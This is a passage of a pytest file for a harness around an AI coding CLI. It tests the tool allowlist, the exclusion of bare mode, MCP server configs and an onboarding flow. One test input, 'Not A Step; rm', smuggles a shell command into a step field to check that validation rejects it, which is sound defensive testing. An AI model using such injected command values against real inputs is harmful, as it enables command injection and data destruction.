    named = tools_flags[0].removeprefix("--tools=").split(",")
    assert "Grep" in named and "Glob" in named, (
        "the whole point of the flag — without these two the CLI does not offer "
        "them at all, and Read cannot answer 'which file mentions X'"
    )
    # The tools every cron job depends on must survive an allowlist.
    for required in ("Bash", "Read", "Edit", "Write", "WebSearch", "WebFetch", "ToolSearch"):
        assert required in named, f"{required} dropped out of the built-in allowlist"
    # Ahead of the separator, or it is passed to the model as literal text.
    assert argv.index(tools_flags[0]) < argv.index("--")


def test_a_turn_never_runs_in_bare_mode(tmp_path, monkeypatch):
    """Bare mode reads no OAuth credentials, skips the claude.ai connectors,
    hooks and CLAUDE.md, and has no off switch (docs/tasks/bare-default-risk.md).

    `--bare` and `CLAUDE_CODE_SIMPLE=1` are the two ways in; the CLI documents
    neither a `--no-bare` nor a `CLAUDE_CODE_SIMPLE=0` (read 2026-10-19). So
    this pins the only thing we control: we never ask for it, and a parent
    that set the variable cannot hand it to the child. Checked against the env
    the fake CLI actually receives, not `_scrubbed_env()` alone, so the test
    fails if the variable ever reaches the process by another route.
    """
    fake_bin = tmp_path / "claude"
    write_executable(fake_bin, textwrap.dedent(
            """\
            #!/usr/bin/env python3
            import json, os, sys
            print(json.dumps({
                "is_error": False,
                "subtype": "success",
                "result": json.dumps({
                    "argv": sys.argv[1:],
                    "simple": os.environ.get("CLAUDE_CODE_SIMPLE"),
                }),
                "session_id": "s1",
                "permission_denials": [],
            }))
            """
        ))
    _with_claude_bin(monkeypatch, str(fake_bin))
    monkeypatch.setenv("CLAUDE_CODE_SIMPLE", "1")

    seen = json.loads(asyncio.run(run_claude("hello")).result_text)

    assert seen["simple"] is None, "an inherited CLAUDE_CODE_SIMPLE reached the CLI"
    flags = seen["argv"][: seen["argv"].index("--")]
    assert not any(a.startswith("--bare") for a in flags)


def test_tools_flag_does_not_name_a_write_tool_nobody_decided_on() -> None:
    """Adding a name widens what the model may reach for BEFORE the hook sees
    it, so this list is a decision and the suite should notice a quiet edit.

    Not a security boundary — hooks/pretooluse.py is — but the same standing
    rule as deploy/marlow-settings.json's allow list: a tool arriving here
    without anyone saying so is the shape that gets missed.
    """
    from server.boundaries import VETTED_BUILTIN_TOOLS

    assert set(VETTED_BUILTIN_TOOLS) == {
        "Bash", "Edit", "Read", "Write", "Grep", "Glob",
        "ToolSearch", "Skill", "WebSearch", "WebFetch",
    }
    # TodoWrite does not exist at this CLI version, which is why it is absent
    # here — and why the allow entry for it in marlow-settings.json has never
    # matched anything.
    assert "TodoWrite" not in VETTED_BUILTIN_TOOLS


def test_weather_mcp_config_is_one_inline_token_ahead_of_the_separator(tmp_path, monkeypatch):
    """The weather server rides on every call (docs/tasks/weather-mcp.md).

    Inline JSON so there is no config file for the agent to rewrite; one token
    because `--mcp-config` is variadic like `--tools`; `-I` because the CLI
    spawns the server with cwd = the agent-writable working dir.
    """
    fake_bin = tmp_path / "claude"
    write_executable(fake_bin, textwrap.dedent(
            """\
            #!/usr/bin/env python3
            import json, sys
            print(json.dumps({
                "is_error": False,
                "subtype": "success",
                "result": "\\x00".join(sys.argv[1:]),
                "session_id": "s1",
                "permission_denials": [],
            }))
            """
        ))
    _with_claude_bin(monkeypatch, str(fake_bin))

    argv = asyncio.run(run_claude("hello")).result_text.split("\x00")

    flags = [arg for arg in argv if arg.startswith("--mcp-config")]
    assert len(flags) == 1 and flags[0].startswith("--mcp-config="), flags
    assert "--strict-mcp-config" not in argv, "strips Gmail/Calendar; see invoke.py"
    assert argv.index(flags[0]) < argv.index("--")
    server = json.loads(flags[0].removeprefix("--mcp-config="))["mcpServers"]["weather"]
    assert server["type"] == "stdio"
    assert server["alwaysLoad"] is True, "weather is front and centre, not behind ToolSearch"
    assert server["args"][0] == "-I"
    assert os.path.isfile(server["args"][1]) and server["args"][1].endswith("weather_mcp.py")
    # Its problem log lives with the server's own, where a format change at a
    # national weather service would be noticed.
    assert server["args"][2:] == ["--log", str(real_settings.log_dir / "weather.log")]
    assert os.access(server["command"], os.X_OK)


# --- Onboarding (docs/tasks/onboarding-v2.md, "Harness design") -------------

_ARGV_ECHO_CLAUDE = """\
#!/usr/bin/env python3
import json, sys
print(json.dumps({
    "is_error": False,
    "subtype": "success",
    "result": "\\x00".join(sys.argv[1:]),
    "session_id": "s1",
    "permission_denials": [],
}))
"""


def _onboarding_box(tmp_path, monkeypatch, *, user_text: str) -> None:
    """A working dir with the shipped step file and the given USER.md, its own
    data dir, and a claude that echoes its argv."""
    from pathlib import Path

    wd = tmp_path / "wd"
    (wd / "memory").mkdir(parents=True)
    (wd / "SOUL.md").write_text("Test SOUL.\n")
    (wd / "USER.md").write_text(user_text)
    shipped = Path(__file__).resolve().parent.parent / "identity" / "FIRST-RUN.md"
    (wd / "FIRST-RUN.md").write_text(shipped.read_text())
    (tmp_path / "data").mkdir()
    fake_bin = tmp_path / "claude"
    write_executable(fake_bin, _ARGV_ECHO_CLAUDE)
    monkeypatch.setattr(
        "server.invoke.settings",
        dataclasses.replace(
            real_settings,
            claude_bin=str(fake_bin),
            working_dir=wd,
            user_path=wd / "USER.md",
            soul_path=wd / "SOUL.md",
            memory_dir=wd / "memory",
            data_dir=tmp_path / "data",
        ),
    )


def _mcp_servers(argv: list[str]) -> dict:
    flags = [arg for arg in argv if arg.startswith("--mcp-config=")]
    assert len(flags) == 1, flags
    return json.loads(flags[0].removeprefix("--mcp-config="))["mcpServers"]


_ONBOARDING_USER = "## Everything else\nNot yet known.\n"


def test_onboarding_turn_carries_the_step_line_and_the_tool(tmp_path, monkeypatch):
    """A chat turn on a box still onboarding gets the current step on the
    prompt and the onboarding server beside weather, handed the steps from the
    current one on (the tool's result is the next step's text)."""
    _onboarding_box(tmp_path, monkeypatch, user_text=_ONBOARDING_USER)

    result = asyncio.run(run_claude("hello", source="chat"))
    argv = result.result_text.split("\x00")

    assert result.onboarding_step == "name", "queue counts the turn against this step"
    servers = _mcp_servers(argv)
    assert set(servers) == {"weather", "onboarding"}
    server = servers["onboarding"]
    assert server["type"] == "stdio" and server["alwaysLoad"] is True
    assert server["args"][0] == "-I"
    assert os.path.isfile(server["args"][1]) and server["args"][1].endswith("onboarding_mcp.py")
    assert server["args"][2] == "--steps"
    steps = json.loads(server["args"][3])
    assert [s["id"] for s in steps][:2] == ["name", "stay-on-top"] and len(steps) == 6
    assert "\n\n[Onboarding step 1 of 6 (name): " in argv[-1], "below the context block"
    assert argv[-1].rstrip().endswith("hello")


def test_onboarding_is_never_on_an_unattended_turn(tmp_path, monkeypatch):
    """Cron runs mid-onboarding just do their job: no step line, no tool."""
    _onboarding_box(tmp_path, monkeypatch, user_text=_ONBOARDING_USER)

    argv = asyncio.run(run_claude("job", source="cron")).result_text.split("\x00")

    assert set(_mcp_servers(argv)) == {"weather"}
    assert "Onboarding step" not in argv[-1]


def test_onboarding_is_off_once_finished(tmp_path, monkeypatch):
    """A box past onboarding (no placeholder) never sees the line or the tool."""
    _onboarding_box(tmp_path, monkeypatch, user_text="## Everything else\nLikes boats.\n")

    result = asyncio.run(run_claude("hello", source="chat"))
    argv = result.result_text.split("\x00")

    assert result.onboarding_step is None
    assert set(_mcp_servers(argv)) == {"weather"}
    assert "Onboarding step" not in argv[-1]


def test_onboarding_skips_a_raw_prompt(tmp_path, monkeypatch):
    """raw_prompt turns (compaction) get no context, so no onboarding either."""
    _onboarding_box(tmp_path, monkeypatch, user_text=_ONBOARDING_USER)

    argv = asyncio.run(run_claude("compact", source="chat", raw_prompt=True)).result_text.split("\x00")

    assert set(_mcp_servers(argv)) == {"weather"}
    assert "Onboarding step" not in argv[-1]


def test_onboarding_survives_a_broken_step_file(tmp_path, monkeypatch):
    """A step file that doesn't parse costs onboarding for the turn, never the
    turn: it still runs, with weather and without the tool."""
    _onboarding_box(tmp_path, monkeypatch, user_text=_ONBOARDING_USER)
    (tmp_path / "wd" / "FIRST-RUN.md").write_text("## wrong\nnope\n")

    result = asyncio.run(run_claude("hello", source="chat"))

    assert not result.is_error
    argv = result.result_text.split("\x00")
    assert set(_mcp_servers(argv)) == {"weather"}
    assert "Onboarding step" not in argv[-1]


@pytest.mark.parametrize(
    "tool_input, expected",
    [
        ({"step": "one-thing", "outcome": "done", "note": "the dentist"}, "one-thing done"),
        ({"step": "tour", "outcome": "skipped"}, "tour skipped"),
        ({"step": "tour", "outcome": "maybe"}, None),
        ({"step": "Not A Step; rm", "outcome": "done"}, None),
        ({"outcome": "done"}, None),
        ({"step": ["name"], "outcome": "done"}, None),
        ({"step": "made-up", "outcome": "done"}, None),
    ],
)
def test_step_done_target_keeps_step_and_outcome_only(tool_input, expected):
    """The activity log keeps step and outcome, never the free-text note."""
    from server.invoke import _tool_target

    assert _tool_target("mcp__onboarding__step_done", tool_input) == expected
